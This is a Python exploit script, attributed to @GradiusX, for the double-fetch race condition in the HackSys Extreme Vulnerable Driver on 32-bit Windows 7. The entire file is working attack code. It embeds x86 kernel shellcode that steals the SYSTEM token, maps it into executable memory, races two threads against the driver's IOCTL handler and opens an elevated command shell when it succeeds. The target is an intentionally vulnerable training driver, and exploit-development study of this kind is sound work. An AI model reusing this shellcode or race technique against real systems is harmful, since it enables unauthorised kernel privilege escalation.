import ctypes, os, struct, sys, threading, multiprocessing, time, win32con
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

ntdll = windll.ntdll
kernel32 = windll.kernel32
psapi = windll.psapi

def debug_print(message):
	""" Prints message in terminal and debugger """
	print message
	kernel32.OutputDebugStringA(message + "\n")


def heap_alloc_payload():
	''' Allocs SYSTEM token stealing shellcode in memory '''
	token_stealing_shellcode = (
		#---[Setup]
		"\x60"                          # pushad
		"\x64\xA1\x24\x01\x00\x00" 	    # mov eax, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
		"\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00"      # mov ebx, [eax + TOKEN_OFFSET]
		#---[Copy System PID token]	
		"\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET           |
		"\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx     |
		"\x75\xED"                      # jnz                           ->|
		"\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
		#---[Recover]	
		"\x61"                          # popad
		"\x31\xC0"                      # NTSTATUS -> STATUS_SUCCESS
		"\x5D"                          # pop ebp
		"\xC2\x08\x00"                  # ret 8
	)
	
	payload_length = len(token_stealing_shellcode)
	payload_address = id(token_stealing_shellcode) + 20
	debug_print ("[+] Payload address: 0x%X" % payload_address)
	return payload_length, payload_address
    

def virtual_alloc_payload():
	''' Allocs shellcode in executable region '''
	payload_length, payload_address = heap_alloc_payload()
	va_address = kernel32.VirtualAlloc(None, 1024, win32con.MEM_COMMIT | win32con.MEM_RESERVE, win32con.PAGE_EXECUTE_READWRITE)
	debug_print ("[+] VirtualAlloc address: 0x%X" % va_address)
	debug_print ("[+] Copying payload to VirtualAlloc region")
	ctypes.memmove(va_address, payload_address, payload_length)
	return va_address
	

class DOUBLE_FETCH(Structure):
	_fields_ = [ 	("Buffer", c_char_p),
					("Size", c_uint)	]
					
input_buffer = DOUBLE_FETCH()
	
def racing_thread(shellcode_ptr):
	''' Racing thread to exploit TOCTOU '''
	input_buffer.Buffer = c_char_p("A" * 0x820 + struct.pack("<L", shellcode_ptr))
	input_buffer.Size = 0x200
	for x in range(100000):
		input_buffer.Size ^= 0xA24
		
		
def main_thread(driver_handle):
	''' Main thread to call vulnerable function '''
	for y in range(100000):
		dwReturn = c_ulong()
		kernel32.DeviceIoControl(driver_handle, 0x222037, byref(input_buffer), 0, None, 0,byref(dwReturn), None)	
	
	
def trigger_double_fetch():
	''' Main Logic '''
	driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
	if not driver_handle or driver_handle == -1:
		debug_print ("[!] Driver handle not found : Error " + str(ctypes.GetLastError()))
		sys.exit()
	
	if multiprocessing.cpu_count() < 2:
		debug_print ("[!] Winning Race With 1 Core Is Hard")
		sys.exit()
			
	shellcode_ptr = virtual_alloc_payload()
			
	debug_print ("[+] Launching racing thread")
	t1 = threading.Thread(target=racing_thread, args=(shellcode_ptr,))
	t1.start()
	
	debug_print ("[+] Launching main thread")	
	t2 = threading.Thread(target=main_thread, args=(driver_handle,))
	t2.start()
	
	debug_print ("[+] Waiting for Double Fetch to trigger ...")	
	t1.join()
	t2.join()
	
	if shell.IsUserAnAdmin():
		debug_print("[*] Enjoy Elevated Privs !\r\n")
		os.system('cmd.exe')
	else:
		debug_print("[-] Exploit did not work. Re-run it!")
	
		
def preamble():
	""" Description """
	debug_print ("")
	debug_print ("HackSys Extreme Vulnerable Driver : Double Fetch")
	debug_print ("")
	debug_print ("Target Machine : Windows 7 32-bit")
	debug_print ("Author: @GradiusX")
	debug_print ("")
		
if __name__ == '__main__':
	""" Main Function """
	preamble()
	trigger_double_fetch()